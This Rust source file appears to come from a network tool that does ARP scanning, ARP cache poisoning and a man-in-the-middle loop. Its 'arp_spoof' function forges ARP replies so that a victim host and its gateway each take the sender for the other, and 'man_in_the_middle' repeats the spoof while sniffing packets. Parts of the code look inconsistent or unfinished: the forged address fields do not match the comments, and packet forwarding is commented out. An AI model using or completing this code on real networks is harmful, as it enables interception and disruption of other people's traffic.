use crate::full_packet::FullPacket;
use crate::host::Host;
use crate::network_utils::{self, ARP_HEADER_SIZE};
use crate::sender::Sender;
use crate::sniffer::Sniffer;
use tokio::task::JoinHandle;
use pnet::packet::arp::ArpOperations;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread::sleep;
use std::time::Duration;
use tokio::sync::Mutex;

pub struct PacketHandler {
    pub sniffer: Arc<Mutex<Sniffer>>,
    pub sender: Sender,
}

impl PacketHandler {
    pub fn new(interface_name: &str) -> PacketHandler {
        Self {
            sniffer: Arc::new(Mutex::new(Sniffer::new(
                interface_name,
            ))),
            sender: Sender::new(interface_name),
        }
    }
    
    pub fn background_sniff(&mut self, shutdown_signal: Arc<AtomicBool>) -> JoinHandle<()> {
        let sniffer = Arc::clone(&self.sniffer);
        tokio::spawn(async move {
            let mut sniffer = sniffer.lock().await;
            sniffer.sniff_until(shutdown_signal).await;
        })
    
    }

    pub async fn arp_scan(&mut self) {
        let shutdown_signal = Arc::new(AtomicBool::new(true));

        // Spawn the sniffing task
        let sniffer_task = self.background_sniff(shutdown_signal.clone());

        // Perform ARP scan asynchronously and allow time for sniffing
        self.sender.scan_arp();
        sleep(Duration::from_millis(500));

        // Signal the sniffer to stop and wait for it to finish
        shutdown_signal.store(false, Ordering::Relaxed);
        sniffer_task.await.expect("Sniffer task failed");

        // Process the collected packets after sniffing completes
        let sniffer = self.sniffer.lock().await;
        sniffer.stream.iter().for_each(|packet| {
            match packet {
                FullPacket::FullArp(arp) if arp.arp.operation == ArpOperations::Reply => {
                    println!(
                        "Mac: {:?}, IP: {:?}",
                        arp.arp.sender_hw_addr, arp.arp.sender_proto_addr
                    );
                }
                _ => {}
            };
        })
    }

    // Tell gateway I am the host
    // Tell the host I am the gateway
    pub fn arp_spoof(
        &mut self,
        spoofed_host: &Host,
        gateway: &Host
    ) {

        let mut buffer: Vec<u8> = vec![0u8; ARP_HEADER_SIZE];
        // Tell Host I am the gateway
        let host_arp_spoof = network_utils::create_arp(
            &mut buffer,
            self.sender.host.mac,
            self.sender.host.mac,
            gateway.ip,
            gateway.ip, 
            ArpOperations::Reply,
        );
        self.sender.send_custom_arp(gateway.mac, spoofed_host.mac, host_arp_spoof);

        let mut buffer: Vec<u8> = vec![0u8; ARP_HEADER_SIZE];
        let gateway_arp_spoof = network_utils::create_arp(
            &mut buffer,
            spoofed_host.mac,
            spoofed_host.mac,
            self.sender.host.ip,
            self.sender.host.ip,
            ArpOperations::Reply,
        );
        self.sender.send_custom_arp(spoofed_host.mac, gateway.mac, gateway_arp_spoof);
        


    }

    pub async fn man_in_the_middle(&mut self, spoofed_host: &Host, gateway: &Host) {
        
        
        loop {
            
            let packet= self.sniffer.lock().await.sniff_raw().expect("Can't sniff packet");
            self.arp_spoof(spoofed_host, gateway);
            // self.sender.send(&packet);
        }
        // Spawn the sniffing task

        
    }
}
